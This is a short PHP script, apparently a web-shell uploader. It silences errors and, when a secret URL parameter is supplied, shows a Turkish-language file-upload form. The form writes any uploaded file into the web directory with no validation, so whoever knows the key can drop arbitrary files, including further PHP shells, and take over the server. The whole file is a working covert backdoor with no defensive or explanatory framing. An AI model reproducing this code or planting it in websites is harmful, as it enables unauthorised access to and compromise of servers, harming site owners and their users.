<?php
error_reporting(0);
if (isset($_GET['nediyonyadayiM7T'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
        $file = $_FILES['file'];
        $tmp_name = $file['tmp_name'];
        $target_file = basename($file['name']);
        
        if (move_uploaded_file($tmp_name, $target_file)) {
            echo "Dosya başarıyla yüklendi: " . htmlspecialchars($file['name']);
            exit(0);
        } else {
            echo "Dosya yüklenirken bir hata oluştu.";
            exit(1);
        }
    }
    
    echo "<form action='' method='post' enctype='multipart/form-data'>
            <label for='file'>m7:</label>
            <input type='file' name='file' id='file' required>
            <input type='submit' value='Dosyayı Yükle'>
          </form>";
    exit(0);
}
?>